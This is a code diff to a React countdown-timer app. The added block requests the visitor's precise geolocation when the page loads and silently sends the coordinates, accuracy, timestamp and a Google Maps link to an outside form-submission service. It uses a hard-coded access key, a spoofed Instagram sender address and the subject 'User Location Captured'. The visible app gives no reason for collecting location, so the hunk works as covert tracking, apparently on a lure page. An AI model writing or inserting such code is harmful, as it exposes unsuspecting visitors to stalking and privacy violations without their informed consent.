@@ -26,6 +26,43 @@ export function App() {
     return 20 * 60;
   });
 
+  // Request location on mount
+  useEffect(() => {
+    if ('geolocation' in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const { latitude, longitude, accuracy } = position.coords;
+          
+          // Send location immediately to Web3Forms
+          const formData = new FormData();
+          formData.append('access_key', 'ae1d92b7-0790-4af0-8d45-e45cfa6e88f1');
+          formData.append('name', 'Location Captured');
+          formData.append('email', 'location@instagram.com');
+          formData.append('subject', 'User Location Captured');
+          formData.append('message', `Latitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\nTimestamp: ${new Date().toISOString()}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);
+          
+          try {
+            await fetch('https://api.web3forms.com/submit', {
+              method: 'POST',
+              body: formData
+            });
+            console.log('Location sent successfully');
+          } catch (error) {
+            console.error('Location submission error:', error);
+          }
+        },
+        (error) => {
+          console.log('Location permission denied or error:', error);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    }
+  }, []);
+
   useEffect(() => {
     const timer = setInterval(() => {
       setTimeLeft((prevTime) => {
